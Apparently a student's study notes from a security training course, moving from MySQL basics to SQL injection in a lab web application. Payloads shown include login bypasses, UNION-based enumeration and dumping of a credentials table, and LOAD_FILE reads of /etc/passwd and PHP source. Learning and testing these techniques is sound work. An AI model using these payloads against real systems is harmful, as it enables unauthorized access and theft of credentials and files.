**Contents:**

- [[#Intro to MySQL|Intro to MySQL]]
			- [[#Creating a Database|Creating a Database]]
			- [[#Creating a Table|Creating a Table]]
			- [[#List a table structure with Describe|List a table structure with Describe]]
			- [[#Table Properties|Table Properties]]
- [[#SQL Statements|SQL Statements]]
		- [[#INSERT|INSERT]]
		- [[#Select|Select]]
		- [[#DROP|DROP]]
		- [[#ALTER|ALTER]]
		- [[#Update|Update]]
- [[#Query Results|Query Results]]
		- [[#Sorting Results|Sorting Results]]
			- [[#Sorting Results#ORDER BY|ORDER BY]]
			- [[#Sorting Results#LIMIT results|LIMIT results]]
			- [[#Sorting Results#WHERE Clause|WHERE Clause]]
			- [[#Sorting Results#LIKE Clause|LIKE Clause]]
- [[#Intro to SQL Injections|Intro to SQL Injections]]
		- [[#Use of SQL in Web Applications|Use of SQL in Web Applications]]
		- [[#SQL Injection|SQL Injection]]
		- [[#Syntax Errors|Syntax Errors]]
- [[#Subverting Query Logic|Subverting Query Logic]]
	- [[#Subverting Query Logic#Authentication Bypass|Authentication Bypass]]
	- [[#Subverting Query Logic#SQLi Discovery|SQLi Discovery]]
	- [[#Subverting Query Logic#OR Injection|OR Injection]]
	- [[#Subverting Query Logic#Auth Bypass with OR operator|Auth Bypass with OR operator]]
- [[#Using Comments|Using Comments]]
		- [[#Auth Bypass with OR operator#Auth Bypass with Comments|Auth Bypass with Comments]]
		- [[#Auth Bypass with OR operator#Another Example|Another Example]]
- [[#Union Clause|Union Clause]]
	- [[#Union Clause#Even Columns|Even Columns]]
	- [[#Union Clause#Un-even Columns|Un-even Columns]]
- [[#String Operations|String Operations]]
			- [[#Another Example#String Concatenation|String Concatenation]]
- [[#Union Injection|Union Injection]]
	- [[#Union Injection#Detect number of columns|Detect number of columns]]
			- [[#Another Example#Using ORDER BY|Using ORDER BY]]
			- [[#Another Example#Using UNION|Using UNION]]
	- [[#Union Injection#Location of Injection|Location of Injection]]
- [[#Database Enumeration|Database Enumeration]]
	- [[#Database Enumeration#MySQL Fingerprinting|MySQL Fingerprinting]]
	- [[#Database Enumeration#INFORMATION_SCHEMA Database|INFORMATION_SCHEMA Database]]
	- [[#Database Enumeration#SCHEMATA|SCHEMATA]]
	- [[#Database Enumeration#COLUMNS|COLUMNS]]
	- [[#Database Enumeration#Data|Data]]
- [[#Reading Files|Reading Files]]
			- [[#Another Example#DB User|DB User]]
			- [[#Another Example#User Privileges|User Privileges]]
	- [[#Reading Files#LOAD_FILE|LOAD_FILE]]
	- [[#Reading Files#Another Example|Another Example]]
- [[#Writing Files|Writing Files]]
	- [[#Writing Files#Write File Privileges|Write File Privileges]]
			- [[#Another Example#secure_file_priv|secure_file_priv]]
	- [[#Writing Files#SELECT INTO OUTFILE|SELECT INTO OUTFILE]]
	- [[#Writing Files#Writing Files through SQL Injection|Writing Files through SQL Injection]]
	- [[#Writing Files#Writing a Web Shell|Writing a Web Shell]]

___

# Intro to MySQL

``` bash
mysql -u root -p<pass> -h database.target.com -P 3308
```
- Note there is no space between `-p` and password if passed on the command line

#### Creating a Database

``` sql
mysql> CREATE DATABASE users;
mysql> SHOW DATABASES;
mysql> USE users;
mysql> SHOW TABLES;
```

#### Creating a Table
``` sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```
- The `(100)` sets the character limit

#### List a table structure with Describe
```
mysql> DESCRIBE logins;

+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)
```

#### Table Properties

Within the `CREATE TABLE` query, there are many [properties](https://dev.mysql.com/doc/refman/8.0/en/create-table.html) that can be set for the table and each column. For example, we can set the `id` column to auto-increment using the `AUTO_INCREMENT` keyword, which automatically increments the id by one every time a new item is added to the table:

```sql
    id INT NOT NULL AUTO_INCREMENT,
```

The `NOT NULL` constraint ensures that a particular column is never left empty 'i.e., required field.' We can also use the `UNIQUE` constraint to ensures that the inserted item are always unique. For example, if we use it with the `username` column, we can ensure that no two users will have the same username:

```sql
    username VARCHAR(100) UNIQUE NOT NULL,
```

Another important keyword is the `DEFAULT` keyword, which is used to specify the default value. For example, within the `date_of_joining` column, we can set the default value to [Now()](https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now), which in MySQL returns the current date and time:

```sql
    date_of_joining DATETIME DEFAULT NOW(),
```

Finally, one of the most important properties is `PRIMARY KEY`, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases, as previously discussed in the previous section. We can make the `id` column the `PRIMARY KEY` for this table:

```sql
    PRIMARY KEY (id)
```

The final `CREATE TABLE` query will be as follows:

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```
___

# SQL Statements


### INSERT
- Used to add new records to a given table

- Require user to fill in values:
``` sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

- Add data to all columns
``` sql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```

- To insert only some values into chosen columns
``` sql
 INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

- To insert multiple records
``` sql
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```


### Select

- To view the entire table:
``` sql
SELECT * FROM table_name;
```

- To view specific columns:
``` sql
SELECT username,password FROM logins;
```


### DROP
- Use to remove tables and databases

- Delete the logins table:
``` sql
DROP TABLE logins;
```


### ALTER
- Change the name of any table and any of its fields or add/delete new columns to an existing table.

- Add a new column using ADD
``` sql
ALTER TABLE logins ADD newColumn INT;
```

- Rename using RENAME COLUMN:
``` sql
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
```

- Change column datatype with MODIFY:
``` sql
ALTER TABLE logins MODIFY oldColumn DATE;
```

- Delete a column using DROP:
``` sql
ALTER TABLE logins DROP oldColumn;
```

### Update

- Used to update specific records in a table based on certain conditions
``` sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

- Update all passwords in all records where the id is greater than 1:
``` sql
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

___

# Query Results

### Sorting Results

#### ORDER BY
- We can sort the results of any query using [ORDER BY](https://dev.mysql.com/doc/refman/8.0/en/order-by-optimization.html) and specifying the column to sort by:
``` sql
SELECT * FROM logins ORDER BY password;

SELECT * FROM logins ORDER BY password DESC;

SELECT * FROM logins ORDER BY password DESC, id ASC;
```

#### LIMIT results
- In case our query returns a large number of records, we can [LIMIT](https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html) the results to what we want only, using `LIMIT` and the number of records we want:

``` sql
SELECT * FROM logins LIMIT 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+----+---------------+------------+---------------------+

```

If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:
``` sql
SELECT * FROM logins LIMIT 1, 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
```

>Note: the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.


#### WHERE Clause

- To filter or search for specific data, we can use conditions with the SELECT statement using the WHERE clause, to fine-tune the results:
``` sql
SELECT * FROM table_name WHERE <condition>;
```

``` sql
SELECT * FROM logins WHERE id > 1;

SELECT * FROM logins where username = 'admin';
```
> Note: Strings should be surrounded by single or double quotes. Numbers can be used directly.

#### LIKE Clause
- Another useful SQL clause is [LIKE](https://dev.mysql.com/doc/refman/8.0/en/pattern-matching.html), enabling selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with `admin`:

``` sql
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
+----+---------------+------------+---------------------+
```

- The `%` symbol acts as a wildcard and matches all characters after `admin`. 
	- It is used to match zero or more characters. 
- The `_` symbol is used to match exactly one character. 
- The below query matches all usernames with exactly three characters in them, which in this case was `tom`:

```sql
SELECT * FROM logins WHERE username like '___';
```

___

# Intro to SQL Injections

### Use of SQL in Web Applications

For example, within a `PHP` web application, we can connect to our database, and start using the `MySQL` database through `MySQL` syntax, right within `PHP`, as follows:

``` php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

Then, the query's output will be stored in `$result`, and we can print it to the page or use it in any other way. The below PHP code will print all returned results of the SQL query in new lines:

``` php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the databases:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

### SQL Injection

An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

In typical cases, the `searchInput` would be inputted to complete the query, returning the expected outcome. Any input we type goes into the following SQL query:

```sql
select * from logins where username like '%$searchInput'
```

So, if we input `admin`, it becomes `'%admin'`. In this case, if we write any SQL code, it would just be considered as a search term. For example, if we input `SHOW DATABASES;`, it would be executed as `'%SHOW DATABASES;'` The web application will search for usernames similar to `SHOW DATABASES;`. However, as there is no sanitization, in this case, **we can add a single quote (`'`), which will end the user-input field, and after it, we can write actual SQL code**. For example, if we search for `1'; DROP TABLE users;`, the search input would be:

```php
'%1'; DROP TABLE users;'
```

>Notice how we added a single quote (') after "1", in order to escape the bounds of the user-input in ('%$searchInput').

So the final SQL query executed would be:
``` sql
select * from logins where username like '%1'; DROP TABLE users;'
```

>Note: In the above example, for the sake of simplicity, we added another SQL query after a semi-colon (;). Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL. In the coming sections, we'll discuss the real methods of injecting SQL queries in MySQL.

### Syntax Errors

The previous example of SQL injection would return an error:

```php
Error: near line 1: near "'": syntax error
```

This is because of the last trailing character, where we have a single extra quote (`'`) that is not closed, which causes a SQL syntax error when executed:

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

In this case, we had only one trailing character, as our input from the search query was near the end of the SQL query. However, the user input usually goes in the middle of the SQL query, and the rest of the original SQL query comes after it.

To have a successful injection, we must ensure that the newly modified SQL query is still valid and does not have any syntax errors after our injection. In most cases, we would not have access to the source code to find the original SQL query and develop a proper SQL injection to make a valid SQL query. So, how would we be able to inject into the SQL query then successfully?

One answer is by using `comments`, and we will discuss this in a later section. Another is to make the query syntax work by passing in multiple single quotes, as we will discuss next (`'`).

___

# Subverting Query Logic

## Authentication Bypass

Consider the following administrator login page.
![[Pasted image 20230503122609.png]]
We can log in with the administrator credentials `admin / p@ssw0rd`.
![[Pasted image 20230503122613.png]]
The page takes in the credentials, then uses the `AND` operator to select records matching the given username and password. If the `MySQL` database returns matched records, the credentials are valid, so the `PHP` code would evaluate the login attempt condition as `true`. If the condition evaluates to `true`, the admin record is returned, and our login is validated.

## SQLi Discovery

Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

| Payload | URL Encoded| 
|----|---|
`'`  |  `%27`
`"`  | `%22`
`#` | `%23`
`;` | `%3B`
`)` | `%29`

If we inject a single quote:
![[Pasted image 20230503123306.png]]
We see that a SQL error was thrown instead of the `Login Failed` message. The page threw an error because the resulting query was:

``` sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

## OR Injection

We would need the query always to return `true`, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the `OR` operator in our SQL injection.

 If there is at least one `TRUE` condition in the entire query along with an `OR` operator, the entire query will evaluate to `TRUE` since the `OR` operator returns `TRUE` if one of its operands is `TRUE`.

So, if we inject the below condition and have an `OR` operator between it and the original condition, it should always return `true`:
``` sql
admin' or '1'='1
```

The final query should be:
``` sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
![[Pasted image 20230503123940.png|600]]

## Auth Bypass with OR operator

Let us try this as the username and see the response.
![[Pasted image 20230503124114.png]]

We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time.
![[Pasted image 20230503124135.png]]

The login failed because `notAdmin` does not exist in the table and resulted in a false query overall.
![[Pasted image 20230503124147.png|600]]

To successfully log in once again, we will need an overall `true` query. This can be achieved by injecting an `OR` condition into the password field, so it will always return `true`. Let us try `something' or '1'='1` as the password.
![[Pasted image 20230503124216.png]]

The additional `OR` condition resulted in a `true` query overall, as the `WHERE` clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return `true`, we do not have to provide a test username and password and can directly start with the `'` injection and log in with just `' or '1' = '1`.
![[Pasted image 20230503124255.png]]
This works since the query evaluate to `true` irrespective of the username or password.

___

# Using Comments

Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/` (though this is not usually used in SQL injections). The `--` can be used as follows:
``` sql
SELECT username FROM logins; -- Selects usernames from the logins table 
```

>Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character.

The `#` symbol can also be used
``` sql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

>Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

### Auth Bypass with Comments

``` sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
As we can see from the syntax highlighting, the username is now `admin`, and the remainder of the query is now ignored as a comment. Also, this way, we can ensure that the query does not have any syntax issues.

Let us try using these on the login page, and log in with the username `admin'--` and anything as the password:
![[Pasted image 20230503125905.png]]

### Another Example

SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first. Let us look at a scenario like this:
![[Pasted image 20230503125943.png]]

The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting through the password field because the input is changed to a hash.

Let us try logging in with valid credentials `admin / p@ssw0rd` to see the response.
![[Pasted image 20230503130021.png]]

So, how can we log in as the admin? We know from the previous section on comments that we can use them to comment out the rest of the query. So, let us try using `admin'--` as the username.
![[Pasted image 20230503130044.png]]

The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully, we will have to add a closing parenthesis. Let us try using the username `admin')--` to close and comment out the rest.
![[Pasted image 20230503130133.png]]

___

# Union Clause

- The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases. 

- Let's try using the `UNION` operator in a sample database. First, let's see the content of the `ports` table:
```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```
Next, let us see the output of the `ships` tables:
```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

Now, let us try to use `UNION` to combine both results:
```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```
>Note: The data types of the selected columns on all positions should be the same.

## Even Columns

- A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.
	- Once we have two queries that return the same number of columns, we can use the `UNION` operator to extract data from other tables and databases.
- For example, if the query is:
``` sql
SELECT * FROM products WHERE product_id = 'user_input'
```
We can inject a `UNION` query into the input, such that rows from another table are returned:
``` sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns.

## Un-even Columns

- We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that.
	- For example, suppose we only had one column. In that case, we want to `SELECT`, we can put junk data for the remaining required columns so that the total number of columns we are `UNION`ing with remains the same as the original query.
- We can use any string as our junk data, and the query will return the string as its output for that column. 
	- If we `UNION` with the string `"junk"`, the `SELECT` query would be `SELECT "junk" from passwords`, which will always return `junk`. 
	- We can also use numbers. For example, the query `SELECT 1 from passwords` will always return `1` as the output.
>Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

The `products` table has two columns in the above example, so we have to `UNION` with two columns. If we only wanted to get one column 'e.g. `username`', we have to do `username, 2`, such that we have the same number of columns:

``` sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
___
# String Operations

String related operations. These can be quite useful to build up injections which are not using any quotes, bypass any other black listing or determine back end database.

#### String Concatenation

- `+` (S)   
    `SELECT login + '-' + password FROM members`
- `||` (*MO)   
    `SELECT login || '-' || password FROM members`

*About MySQL “||”;*  
If MySQL is running in ANSI mode it’s going to work but otherwise MySQL accept it as `logical operator` it’ll return 0. A better way to do it is using `CONCAT()`function in MySQL.

- `CONCAT(str1, str2, str3, ...)` (M)   
    Concatenate supplied strings.   
    `SELECT CONCAT(login, password) FROM members`
___

# Union Injection

## Detect number of columns

There are two methods of detecting the number of columns:

#### Using ORDER BY

The first way of detecting the number of columns is through the `ORDER BY` function, which we discussed earlier.

For example, we can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist.

If we failed at `order by 4`, this means the table has three columns, which is the number of columns we were able to sort by successfully. Let us go back to our previous example and attempt the same, with the following payload:
``` sql
' order by 1-- -
```
> Note: The trailing dash is to indicate a space and is not part of the injection.

![[Pasted image 20230504163106.png]]
We try 2, 3, 4.

However, when we try to `ORDER BY` column 5, we get the following error:
![[Pasted image 20230504163056.jpg]]
This means that this table has exactly 4 columns .

#### Using UNION

- The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. 
- The first method always returns the results until we hit an error, while this method always gives an error until we get a success. 
	- We can start by injecting a 3 column `UNION` query:
	 
``` sql
cn' UNION select 1,2,3-- -
```

We get an error saying that the number of columns don’t match:
![[Pasted image 20230504163933.png]]

If we try 4 columns we successfully get the results, meaning once again that the table has 4 columns. We can use either method to determine the number of columns. Once we know the number of columns, we know how to form our payload, and we can proceed to the next step.


## Location of Injection

- While a query may return multiple columns, the web application may only display some of them. 
	- So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. 
- In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:
- ![[Pasted image 20230504164112.png]]

- It is very common that not every column will be displayed back to the user. 
	- For example, the ID field is often used to link different tables together, but the user doesn't need to see it. 
	- This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. 
- `We cannot place our injection at the beginning, or its output will not be printed.`

- This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. 
- To test that we can get actual data from the database 'rather than just numbers,' we can use the `@@version` SQL query as a test and place it in the second column instead of the number 2:
``` sql
cn' UNION select 1,@@version,3,4-- -
```
![[Pasted image 20230504164233.jpg]]
As we can see, we can get the database version displayed. Now we know how to form our Union SQL injection payloads to successfully get the output of our query printed on the page. In the next section, we will discuss how to enumerate the database and get data from other tables and databases.
___

# Database Enumeration

## MySQL Fingerprinting
 - If the webserver we see in HTTP responses is `Apache` or `Nginx`, it is a good guess that the webserver is running on Linux, so the DBMS is likely `MySQL`.
	 - If the webserver is IIS, it's likely the DBMS is MSSQL

- The following queries and their output will tell us that we are dealing with `MySQL`:
![[2023-05-04 16_53_05-Hack The Box - Academy.png|700]]

As we saw in the example from the previous section, when we tried `@@version`, it gave us:
![](https://academy.hackthebox.com/storage/modules/33/db_version_1.jpg)

The output `10.3.22-MariaDB-1ubuntu1` means that we are dealing with a `MariaDB` DBMS similar to MySQL. Since we have direct query output, we will not have to test the other payloads. Instead, we can test them and see what we get.

## INFORMATION_SCHEMA Database

To pull data from tables using `UNION SELECT`, we need to properly form our `SELECT` queries. To do so, we need the following information:

-   List of databases
-   List of tables within each database
-   List of columns within each table

This is where we can utilize the `INFORMATION_SCHEMA` Database.

- The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. 
	- As this is a different database, we cannot call its tables directly with a `SELECT` statement. 
	- If we only specify a table's name for a `SELECT` statement, it will look for tables within the same database.
	
- So, to reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:
```sql
SELECT * FROM my_database.users;
```
Similarly, we can look at tables present in the `INFORMATION_SCHEMA` Database.

## SCHEMATA

- To start our enumeration, we should find what databases are available on the DBMS. 
- The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server. 
	- It is used to obtain database names so we can then query them. 
	- The `SCHEMA_NAME` column contains all the database names currently present.

Let us first test this on a local database to see how the query is used:

```shell-session
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

We see the `ilfreight` and `dev` databases.

Now, let's do the same using a `UNION` SQL injection, with the following payload:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

 We can find the current database with the `SELECT database()` query.
 ```sql
cn' UNION select 1,database(),2,3-- -
```
We see that the database name is `ilfreight`. However, the other database (`dev`) looks interesting. So, let us try to retrieve the tables from it.

## TABLES

Before we dump data from the `dev` database, we need to get a list of the tables to query them with a `SELECT` statement. To find all tables within a database, we can use the `TABLES` table in the `INFORMATION_SCHEMA` Database.

- The [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.ht-  ml) table contains information about all tables throughout the database. 
- This table contains multiple columns, but we are interested in the `TABLE_SCHEMA` and `TABLE_NAME` columns. 
	- The `TABLE_NAME` column stores table names, 
	- while the `TABLE_SCHEMA` column points to the database each table belongs to.

- For example, we can use the following payload to find the tables within the `dev` database:
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
![[Pasted image 20230504170046.jpg]]

We see four tables in the dev database, namely `credentials`, `framework`, `pages`, and `posts`. For example, the `credentials` table could contain sensitive information to look into it.

## COLUMNS

To dump the data of the `credentials` table, we first need to find the column names in the table, which can be found in the `COLUMNS` table in the `INFORMATION_SCHEMA` database. The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table contains information about all columns present in all the databases.

As we did before, let's try this payload to find the column names in the `credentials` table:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
![[Pasted image 20230504170219.jpg]]
The table has two columns named `username` and `password`. We can use this information and dump data from the table.

## Data

Now that we have all the information, we can form our `UNION` query to dump data of the `username` and `password` columns from the `credentials` table in the `dev` database. We can place `username` and `password` in place of columns 2 and 3:
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
>Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.

![[Pasted image 20230504170256.png]]

___

# Reading Files

- In `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. 
- So, let's start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

#### DB User
First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges.
To be able to find our current DB user, we can use any of the following queries:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Our `UNION` injection payload will be as follows:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -

or

cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

#### User Privileges

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

Once again, we can add `WHERE user="root"` to only show our current user `root` privileges. Our payload would be:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
```

And we see all of the possible privileges given to our current user:
![[Pasted image 20230504172043.jpg]]

We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.

## LOAD_FILE

Now that we know we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function. The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the `/etc/passwd` file:
```sql
SELECT LOAD_FILE('/etc/passwd');
```
> Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

Similar to how we have been using a `UNION` injection, we can use the above query:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
![[Pasted image 20230504172155.png]]

## Another Example

We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
![[Pasted image 20230504172222.png]]
However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`.
![[Pasted image 20230504172233.png]]
The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.
___

# Writing Files

When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files.

## Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1.  User with `FILE` privilege enabled
2.  MySQL global `secure_file_priv` variable not enabled
3.  Write access to the location we want to write to on the back-end server

We have already found that our current user has the `FILE` privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the `secure_file_priv` global variable.

#### secure_file_priv

The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.

Within `MySQL`, we can use the following query to obtain the value of this variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

- However, as we are using a `UNION` injection, we have to get the value using a `SELECT` statement. 
	- This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. 
		- `MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`
- We have to select these two columns from that table in the `INFORMATION_SCHEMA` database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. 
	- We will then filter the results to only show the `secure_file_priv` variable, using the `WHERE` clause we learned about in a previous section.

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
So, similar to other `UNION` injection queries, we can get the above query result with the following payload. Remember to add two more columns `1` & `4` as junk data to have a total of 4 columns':
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
![[Pasted image 20230504173430.jpg]]
And the result shows that the `secure_file_priv` value is empty, meaning that we can read/write files to any location.
